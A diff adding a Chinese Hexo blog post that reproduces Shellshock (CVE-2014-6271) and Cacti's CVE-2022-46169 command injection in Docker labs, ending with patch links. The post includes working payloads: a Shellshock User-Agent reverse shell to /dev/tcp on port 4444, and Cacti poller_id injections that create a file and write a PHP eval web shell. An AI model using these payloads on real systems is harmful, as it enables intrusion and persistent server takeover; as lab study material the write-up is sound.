@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>bash-cacti | Hexo</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Shellshock 破壳漏洞 CVE-2014-6271简介影响版本​    GNU Bash &lt;&#x3D; 4.3 漏洞概述​        GNU Bash 4.3及之前版本在评估某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行shell命令。某些服务和应用允许未经身份验证的远程攻击者提供环境变量以利用此漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="bash-cacti">
+<meta property="og:url" content="http://example.com/2023/11/16/bash-cacti/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Shellshock 破壳漏洞 CVE-2014-6271简介影响版本​    GNU Bash &lt;&#x3D; 4.3 漏洞概述​        GNU Bash 4.3及之前版本在评估某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行shell命令。某些服务和应用允许未经身份验证的远程攻击者提供环境变量以利用此漏洞">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2023/11/16/bash-cacti/image-20231116192846314.png">
+<meta property="og:image" content="http://example.com/2023/11/16/bash-cacti/image-20231116192957443.png">
+<meta property="og:image" content="http://example.com/2023/11/16/bash-cacti/image-20231116193005060.png">
+<meta property="og:image" content="http://example.com/2023/11/16/bash-cacti/image-20231116193439335.png">
+<meta property="og:image" content="http://example.com/2023/11/16/bash-cacti/image-20231116193939685.png">
+<meta property="og:image" content="http://example.com/2023/11/16/bash-cacti/image-20231117184649623.png">
+<meta property="og:image" content="http://example.com/2023/11/16/bash-cacti/image-20231117184658999.png">
+<meta property="og:image" content="http://example.com/2023/11/16/bash-cacti/image-20231117192506508.png">
+<meta property="og:image" content="http://example.com/2023/11/16/bash-cacti/image-20231117192523826.png">
+<meta property="og:image" content="http://example.com/2023/11/16/bash-cacti/image-20231117192422094.png">
+<meta property="og:image" content="http://example.com/2023/11/16/bash-cacti/image-20231117192645831.png">
+<meta property="og:image" content="http://example.com/2023/11/16/bash-cacti/image-20231117192802776.png">
+<meta property="og:image" content="http://example.com/2023/11/16/bash-cacti/image-20231117192851834.png">
+<meta property="og:image" content="http://example.com/2023/11/16/bash-cacti/image-20231117193222767.png">
+<meta property="og:image" content="http://example.com/2023/11/16/bash-cacti/image-20231117193310036.png">
+<meta property="og:image" content="http://example.com/2023/11/16/bash-cacti/image-20231117193525478.png">
+<meta property="og:image" content="http://example.com/2023/11/16/bash-cacti/image-20231117194052292.png">
+<meta property="og:image" content="http://example.com/2023/11/16/bash-cacti/image-20231117194033255.png">
+<meta property="article:published_time" content="2023-11-16T11:23:06.000Z">
+<meta property="article:modified_time" content="2023-11-30T09:40:27.352Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/11/16/bash-cacti/image-20231116192846314.png">
+  
+    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 5.2.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+				<img lazy-src="" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+			<h1 class="header-author"><a href="/">John Doe</a></h1>
+		</hgroup>
+
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">Home</a></li>
+				        
+							<li><a href="/archives">Archives</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="half-header-menu">
+						<a class="hide">Home</a>
+						<a>Tags</a>
+						<a>Links</a>
+						<a>About</a>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+						<!-- music -->
+						
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/ActiveMQ/" style="font-size: 10px;">ActiveMQ</a> <a href="/tags/ActiveMQ-CVE-2015-5254/" style="font-size: 10px;">ActiveMQ CVE-2015-5254</a> <a href="/tags/CVE-2021-21311-CVE-2021-43008/" style="font-size: 10px;">CVE-2021-21311 CVE-2021-43008</a> <a href="/tags/CVE-2021-25646/" style="font-size: 10px;">CVE-2021-25646</a> <a href="/tags/SQL/" style="font-size: 10px;">SQL</a> <a href="/tags/airflow/" style="font-size: 10px;">airflow</a> <a href="/tags/apisix/" style="font-size: 10px;">apisix</a> <a href="/tags/appweb-aria2/" style="font-size: 10px;">appweb aria2</a> <a href="/tags/couchdb/" style="font-size: 10px;">couchdb</a> <a href="/tags/csrf-ssrf/" style="font-size: 10px;">csrf ssrf</a> <a href="/tags/dns-dubbo/" style="font-size: 10px;">dns dubbo</a> <a href="/tags/php/" style="font-size: 20px;">php</a> <a href="/tags/php-mysql/" style="font-size: 15px;">php;mysql</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82-POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5-%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6-WAF-SQLMAP/" style="font-size: 10px;">堆叠注入,宽字节,POST注入,HTTP头注入,二次注入,写入文件,WAF,SQLMAP</a> <a href="/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/" style="font-size: 20px;">春秋云镜</a>
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/">github</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+				
+				<section class="switch-part switch-part4">
+				
+					<div id="js-aboutme">I&#39;m a developer.</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">Home</a></li>
+		        
+					<li><a href="/archives">Archives</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-bash-cacti" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2023/11/16/bash-cacti/" class="article-date">
+  	<time datetime="2023-11-16T11:23:06.000Z" itemprop="datePublished">2023-11-16</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      bash-cacti
+      
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Shellshock-破壳漏洞-CVE-2014-6271"><a href="#Shellshock-破壳漏洞-CVE-2014-6271" class="headerlink" title="Shellshock 破壳漏洞 CVE-2014-6271"></a>Shellshock 破壳漏洞 CVE-2014-6271</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>​    GNU Bash &lt;= 4.3</p>
+<h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>​        GNU Bash 4.3及之前版本在评估某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行shell命令。某些服务和应用允许未经身份验证的远程攻击者提供环境变量以利用此漏洞。此漏洞源于在调用bash shell之前可以用构造的值创建环境变量。这些变量可以包含代码，在shell被调用后会被立即执行。</p>
+<h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>编译运行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker compose up -d</span><br><span class="line">docker ps</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20231116192846314.png" alt="image-20231116192846314"></p>
+<p>服务启动后，有两个页面<code>http://your-ip:8080/victim.cgi</code>和<code>http://your-ip:8080/safe.cgi</code>。其中safe.cgi是最新版bash生成的页面，victim.cgi是bash4.3生成的页面。</p>
+<p><img src="image-20231116192957443.png" alt="image-20231116192957443"></p>
+<p><img src="image-20231116193005060.png" alt="image-20231116193005060"></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>1.通过BP抓包victim.cgi页面，修改UA值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: () &#123; foo; &#125;; echo Content-Type: text&#x2F;plain; echo; &#x2F;usr&#x2F;bin&#x2F;id</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20231116193439335.png" alt="image-20231116193439335"></p>
+<p>命令被执行</p>
+<p>2.同样抓包safe.cgi页面，修改UA值</p>
+<p><img src="image-20231116193939685.png" alt="image-20231116193939685"></p>
+<p>同样的数据包访问，但是不受影响</p>
+<p>3.对于victim.cgi页面，利用修改UA值来进行反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent:() &#123; :; &#125;; &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.86.162&#x2F;4444 0&gt;&amp;1;</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20231117184649623.png" alt="image-20231117184649623"></p>
+<p><img src="image-20231117184658999.png" alt="image-20231117184658999"></p>
+<h1 id="Cacti命令执行漏洞分析-CVE-2022-46169"><a href="#Cacti命令执行漏洞分析-CVE-2022-46169" class="headerlink" title="Cacti命令执行漏洞分析 (CVE-2022-46169)"></a>Cacti命令执行漏洞分析 (CVE-2022-46169)</h1><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>​    Cacti是一个服务器监控与管理平台，是一套基于PHP,MySQL,SNMP及RRDTool开发的网络流量监测图形分析工具，可为用户提供强大且可扩展的操作监控和故障管理框架。</p>
+<h3 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h3><p>Cacti 1.2.17-1.2.22</p>
+<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>​    在其1.2.17-1.2.22版本中存在一处命令注入漏洞，攻击者可以通过X-Forwarded-For请求头绕过服务端校验并在其中执行任意命令。</p>
+<h2 id="漏洞环境-1"><a href="#漏洞环境-1" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>执行如下命令启动一个Cacti 1.2.22版本服务器：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker compose up -d</span><br><span class="line">docker ps</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20231117192506508.png" alt="image-20231117192506508"></p>
+<p><img src="image-20231117192523826.png" alt="image-20231117192523826"></p>
+<p>环境启动后，访问<code>http://your-ip:8080</code>会跳转到登录页面。使用admin/admin作为账号密码登录，并根据页面中的提示进行初始化。</p>
+<p><img src="image-20231117192422094.png" alt="image-20231117192422094"></p>
+<p>实际上初始化的过程就是不断点击“下一步”，直到安装成功：</p>
+<p><img src="image-20231117192645831.png" alt="image-20231117192645831"></p>
+<p>这个漏洞的利用需要Cacti应用中至少存在一个类似是<code>POLLER_ACTION_SCRIPT_PHP</code>的采集器。所以，我们在Cacti后台首页创建一个新的Graph：</p>
+<p><img src="image-20231117192802776.png" alt="image-20231117192802776"></p>
+<p>选择的Graph Type是“Device - Uptime”，点击创建：</p>
+<p><img src="image-20231117192851834.png" alt="image-20231117192851834"></p>
+<h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>完成上述初始化后，切换到攻击者的角色。作为攻击者，直接访问<code>payload</code> 显示内容如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;remote_agent.php?action&#x3D;polldata&amp;local_data_ids[0]&#x3D;6&amp;host_id&#x3D;1&amp;poller_id&#x3D;&#96;touch+&#x2F;tmp&#x2F;success&#96;</span><br></pre></td></tr></table></figure>
+
+<p>![屏幕截图 2023-11-17 193046](bash-cacti/屏幕截图 2023-11-17 193046.png)</p>
+<p>刷新，抓包</p>
+<p><img src="image-20231117193222767.png" alt="image-20231117193222767"></p>
+<p>修改如下数据包：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;remote_agent.php?action&#x3D;polldata&amp;local_data_ids[0]&#x3D;6&amp;host_id&#x3D;1&amp;poller_id&#x3D;&#96;touch+&#x2F;tmp&#x2F;success&#96; HTTP&#x2F;1.1</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Host: localhost.lan</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:91.0) Gecko&#x2F;20100101 Firefox&#x2F;91.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20231117193310036.png" alt="image-20231117193310036"></p>
+<p>虽然响应包里没有回显，但是进入容器中即可发现<code>/tmp/success</code>已成功被创建：</p>
+<p><img src="image-20231117193525478.png" alt="image-20231117193525478"></p>
+<p>同理，创建木马</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;remote_agent.php?action&#x3D;polldata&amp;local_data_ids[0]&#x3D;6&amp;host_id&#x3D;1&amp;poller_id&#x3D;&#96;echo%20%20&#39;%3C%3Fphp%20%40eval(%24_POST%5B%22cmd%22%5D)%3B%3F%3E&#39;%20%3Eshell.php&#96;</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20231117194052292.png" alt="image-20231117194052292"></p>
+<p><img src="image-20231117194033255.png" alt="image-20231117194033255"></p>
+<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>1）官方升级<br>    目前官方已发布安全补丁修复此漏洞，建议受影响的用户及时安装防护：</p>
+<table>
+<thead>
+<tr>
+<th>版本</th>
+<th>补丁链接</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>v1.2.X</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/Cacti/cacti/commit/b43f13ae7f1e6bfe4e8e56a80a7cd867cf2db52b">https://github.com/Cacti/cacti/commit/b43f13ae7f1e6bfe4e8e56a80a7cd867cf2db52b</a></td>
+</tr>
+<tr>
+<td>v1.3.x</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/Cacti/cacti/commit/b43f13ae7f1e6bfe4e8e56a80a7cd867cf2db52b">https://github.com/Cacti/cacti/commit/b43f13ae7f1e6bfe4e8e56a80a7cd867cf2db52b</a></td>
+</tr>
+</tbody></table>
+<p>注：若在PHP &lt; 7.0下运行1.2.x实例，还需要进一步更改：<a target="_blank" rel="noopener" href="https://github.com/Cacti/cacti/commit/a8d59e8fa5f0054aa9c6981b1cbe30ef0e2a0ec9">https://github.com/Cacti/cacti/commit/a8d59e8fa5f0054aa9c6981b1cbe30ef0e2a0ec9</a></p>
+<p>2）进行版本更新<br>    从官方下载最新版本</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2023/11/17/celery-coldfusion/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">&lt;</strong>
+      <div class="article-nav-title">
+        
+          celery-coldfusion
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2023/11/15/appweb-aria2/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">appweb-aria2</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2023 John Doe
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/preccrep/hexo-theme-jelly" target="_blank">Jelly</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: false,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
